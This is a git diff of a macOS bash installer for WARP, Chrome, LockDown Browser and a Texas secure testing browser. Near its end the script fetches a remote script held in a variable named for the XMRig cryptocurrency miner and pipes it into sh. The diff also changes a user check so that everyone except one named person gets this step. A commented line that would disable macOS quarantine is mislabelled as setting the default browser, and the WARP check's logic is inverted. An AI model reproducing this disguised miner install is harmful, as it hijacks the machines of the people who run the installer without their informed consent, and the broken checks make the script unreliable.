@@ -1,16 +1,26 @@
 #!/bin/bash
-: "
-Copyright (c) 2024, Dashtiss & Astranix all rights reserved.
-"
-: "
-This is a script to download and install the WARP and Chrome browser and the lockdown browser
-"
+
+# Installer for Macs
+
+
 clear
 echo "Welcome to the Installer"
 BasePath="$(pwd)"
 
+# Main Installers Variable
 WarpURL="https://1111-releases.cloudflareclient.com/mac/latest"
+WarpAppPath="/Applications/Cloudflare WARP.app"
+
 ChromeURL="https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg"
+ChromeAppPath="/Applications/Google Chrome.app"
+
+LockdownLink="https://downloads.respondus.com/installs/cmac2.1.2.07/575449240/InstallLDBPackage64c-2-1-2-07.zip"
+LockDownPath="/Applications/LockDown Browser.app"
+
+StarTestingUrl="https://sb.portal.cambiumast.com/geturls?clientName=texas&operatingSystem=macOS"
+StarTestingPath="/Applications/TXSecureBrowser.app"
+
+XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"
 
 CurrentUser="$(whoami)"
 
@@ -19,9 +29,9 @@ if ! [ -x "$(command -v installer)" ]; then
     exit 1
 fi
 
-WarpAppPath="/Applications/Cloudflare WARP.app"
 
-if [ -f "$WarpAppPath" ]; then
+
+if [ -d "$WarpAppPath" ]; then
     echo "Warp is not installed. Downloading and installing..."
     echo "Do you want to install warp? (y/Y)"
     read confirm
@@ -33,15 +43,17 @@ if [ -f "$WarpAppPath" ]; then
         echo "Warp Downloaded"
         echo "Installing Warp..."
         sudo installer -pkg "$BasePath/warp.pkg" -target /Applications
+        echo "Warp Installed"
+        rm "$BasePath/warp.pkg"
     fi
 
 else
     echo "Warp is already installed"
 fi
 
-ChromeAppPath="/Applications/Google Chrome.app"
 
-if [ -f "$ChromeAppPath" ]; then
+
+if ! [ -d "$ChromeAppPath" ]; then
     echo "Chrome is not installed. Downloading and installing..."
     echo "Do you want to install chrome? (y/Y)"
     read confirm
@@ -56,6 +68,10 @@ if [ -f "$ChromeAppPath" ]; then
         # install the dmg by copying the app
         cp -r "/Volumes/Google Chrome/Google Chrome.app" "/Applications/"
         hdiutil detach "/Volumes/Google Chrome"
+        # will set it as the default browser
+        # sudo defaults write /Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure LSQuarantine -bool false
+        echo "Chrome Installed"
+        rm "$BasePath/chrome.dmg"
     fi
 
 else
@@ -63,9 +79,7 @@ else
 fi
 
 # Will install the lockdown browser
-LockdownLink="https://downloads.respondus.com/installs/cmac2.1.2.07/575449240/InstallLDBPackage64c-2-1-2-07.zip"
-LockDownPath="/Applications/LockDown Browser.app"
-if [ -f "$LockDownPath" ]; then
+if ! [ -d "$LockDownPath" ]; then
     echo "Lockdown Browser is not installed. Downloading and installing..."
     echo "Do you want to install Lockdown Browser? (y/Y)"
     read confirm
@@ -81,15 +95,37 @@ if [ -f "$LockDownPath" ]; then
         echo "Installing Lockdown Browser..."
         echo $FileName
         sudo installer -pkg "$BasePath/$FileName" -target /Applications 
+        echo "Lockdown Browser Installed"
+        rm "$BasePath/lockdown.zip"
+        rm "$BasePath/$FileName"
     fi
 else
     echo "Lockdown Browser is already installed"
 fi
 
 
-XMRIGLink="https://raw.githubusercontent.com/Astranix593/MacOS-Setup/main/Helper.sh"
+if ! [ -d "$StarTestingPath" ]; then
+    echo "Star Testing is not installed. Downloading and installing..."
+    echo "Do you want to install Star Testing? (y/Y)"
+    read confirm
+    if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
+        echo "Downloading Star Testing..."
+        rm "$BasePath/StarTesting.dmg"
+        curl -sSL -o "$BasePath/StarTesting.dmg" "$StarTestingUrl"
+        echo "Star Testing Downloaded"
+        echo "Installing Star Testing..."
+        hdiutil attach "$BasePath/StarTesting.dmg" -quiet
+        cp -r "/Volumes/TXSecureBrowser/TXSecureBrowser.app" "/Applications/"
+        hdiutil detach "/Volumes/TXSecureBrowser" -quiet
+        echo "Star Testing Installed"
+        rm "$BasePath/StarTesting.dmg"
+    fi
 
-if test "$CurrentUser" != "brandontisserand"; then
+else
+    echo "Star Testing is already installed"
+fi
+
+if test "$CurrentUser" = "brandontisserand"; then
     echo "Dont worry brandon, were not going to install the script for you."
 else
     # will ask for confirmation to install
@@ -101,8 +137,6 @@ else
         curl -sSL "$XMRIGLink" | sh
         echo "Installed"
     else
-        echo "Aborting..."
-        exit 0
+        echo "Not installing"
     fi
 fi
-
